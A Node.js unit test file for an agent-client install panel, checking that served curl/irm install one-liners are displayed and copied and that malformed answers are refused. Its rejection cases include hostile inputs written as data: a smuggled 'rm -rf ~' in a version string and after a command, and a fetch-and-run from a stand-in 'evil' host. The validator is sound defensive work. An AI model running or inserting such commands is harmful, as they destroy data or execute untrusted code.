// Run: node --import ./tests/unit/register-ts.mjs --test tests/unit/octryxInstall.test.mjs
//
// Agents → Install octryx-claude: the platform's /octryx-claude/version answer becomes copy-paste one-liners;
// anything unexpected is refused instead of shown as a command. Requests are stubs.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { createElement } from "react";
import TestRenderer from "react-test-renderer";
import {
  installErrorText,
  macosCommand,
  readOctryxInstall,
  windowsCommand,
} from "../../src/chat/agents/octryxInstallModel.ts";

const require = createRequire(import.meta.url);
const ts = require("typescript");
const { act } = TestRenderer;
globalThis.IS_REACT_ACT_ENVIRONMENT = true;
const SRC = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../src");

const SHA = "a".repeat(64);
const answer = (overrides = {}) => ({
  client: "octryx-claude",
  version: "0.2.0+1a2b3c4d5e6f",
  sha256: SHA,
  requires_python: ">=3.11",
  install: {
    macos: "curl -fsSL 'https://octryx.example.com/octryx-claude/install.sh?workspace=ws-1' | bash",
    windows: "irm 'https://octryx.example.com/octryx-claude/install.ps1?workspace=ws-1' | iex",
  },
  ...overrides,
});

test("readOctryxInstall keeps the served commands, version and checksum", () => {
  assert.deepEqual(readOctryxInstall(answer()), {
    version: "0.2.0+1a2b3c4d5e6f",
    sha256: SHA,
    requiresPython: ">=3.11",
    macos: "curl -fsSL 'https://octryx.example.com/octryx-claude/install.sh?workspace=ws-1' | bash",
    windows: "irm 'https://octryx.example.com/octryx-claude/install.ps1?workspace=ws-1' | iex",
  });
});

test("readOctryxInstall refuses anything that is not exactly an installer one-liner", () => {
  const bad = [
    null, [], "x",
    answer({ version: "1.0; rm -rf ~" }),
    answer({ sha256: "abc" }),
    answer({ install: { macos: "curl -fsSL 'https://evil/x.sh' | bash", windows: answer().install.windows } }),
    answer({ install: { macos: "curl -fsSL 'https://octryx.example.com/octryx-claude/install.sh' | bash; rm -rf ~", windows: answer().install.windows } }),
    answer({ install: { macos: answer().install.macos, windows: "irm 'https://oe/octryx-claude/install.ps1?workspace=a b' | iex" } }),
    answer({ install: { macos: answer().install.macos } }),
  ];
  for (const payload of bad) assert.equal(readOctryxInstall(payload), null, JSON.stringify(payload));
});

test("update and uninstall reuse the installer without the Workspace preselect", () => {
  const install = readOctryxInstall(answer());
  assert.equal(macosCommand(install, "update"), "curl -fsSL 'https://octryx.example.com/octryx-claude/install.sh' | bash -s -- update");
  assert.equal(windowsCommand(install, "uninstall"),
    "& ([scriptblock]::Create((irm 'https://octryx.example.com/octryx-claude/install.ps1'))) uninstall");
});

test("refusals are named by their status", () => {
  assert.match(installErrorText({ status: 404 }), /does not offer/);
  assert.match(installErrorText({ status: 503 }), /client package is missing/);
  assert.match(installErrorText({ status: 422 }), /Workspace cannot be preselected/);
  assert.match(installErrorText(new Error("x")), /could not be loaded/);
});

function load(relative, extra = {}) {
  const cache = new Map();
  const loadFile = (file) => {
    if (cache.has(file)) return cache.get(file).exports;
    const output = ts.transpileModule(fs.readFileSync(file, "utf8"), {
      compilerOptions: { module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.ReactJSX, esModuleInterop: true },
    }).outputText;
    const module = { exports: {} };
    cache.set(file, module);
    vm.runInNewContext(output, {
      module, exports: module.exports, console, URL, Error, Number, Object, Promise, encodeURIComponent, setTimeout,
      ...extra,
      require: (name) => {
        if (name.endsWith(".css")) return {};
        if (name.startsWith(".")) {
          const base = path.resolve(path.dirname(file), name);
          for (const ext of [".tsx", ".ts"]) if (fs.existsSync(base + ext)) return loadFile(base + ext);
        }
        return require(name);
      },
    });
    return module.exports;
  };
  return loadFile(path.join(SRC, relative));
}

const byTestId = (view, id) => view.root.findAll((node) => node.props["data-testid"] === id && typeof node.type === "string");
const text = (node) => node.children.map((child) => (typeof child === "string" ? child : text(child))).join("");
const tick = () => act(async () => { await new Promise((resolve) => setTimeout(resolve, 0)); });

test("the view shows both one-liners, the version and checksum, and copies a command", async () => {
  const copied = [];
  const navigator = { clipboard: { writeText: async (value) => { copied.push(value); } } };
  const { AgentsInstallClient } = load("chat/agents/AgentsInstallClient.tsx", { navigator, window: { setTimeout } });
  const asked = [];
  let view;
  await act(async () => {
    view = TestRenderer.create(createElement(AgentsInstallClient, {
      workspaceId: "ws-1", load: async (id) => { asked.push(id); return answer(); } }));
  });
  try {
    await tick();
    assert.deepEqual(asked, ["ws-1"]);
    assert.equal(text(byTestId(view, "agents-install-macos")[0]), answer().install.macos);
    assert.equal(text(byTestId(view, "agents-install-windows")[0]), answer().install.windows);
    assert.equal(text(byTestId(view, "agents-install-version")[0]), "0.2.0+1a2b3c4d5e6f");
    assert.equal(text(byTestId(view, "agents-install-sha256")[0]), SHA);
    await act(async () => { await byTestId(view, "agents-install-windows-copy")[0].props.onClick(); });
    assert.deepEqual(copied, [answer().install.windows]);
    assert.equal(text(byTestId(view, "agents-install-windows-copy")[0]), "Copied");
  } finally { act(() => view.unmount()); }
});

test("the view refuses an unusable answer and names a failed request", async () => {
  const { AgentsInstallClient } = load("chat/agents/AgentsInstallClient.tsx", { navigator: {}, window: { setTimeout } });
  for (const [loader, expected] of [
    [async () => answer({ sha256: "nope" }), /did not contain usable install commands/],
    [async () => { throw Object.assign(new Error("x"), { status: 503 }); }, /client package is missing/],
  ]) {
    let view;
    await act(async () => { view = TestRenderer.create(createElement(AgentsInstallClient, { workspaceId: null, load: loader })); });
    try {
      await tick();
      assert.match(text(byTestId(view, "agents-install-error")[0]), expected);
      assert.equal(byTestId(view, "agents-install-macos").length, 0);
    } finally { act(() => view.unmount()); }
  }
});
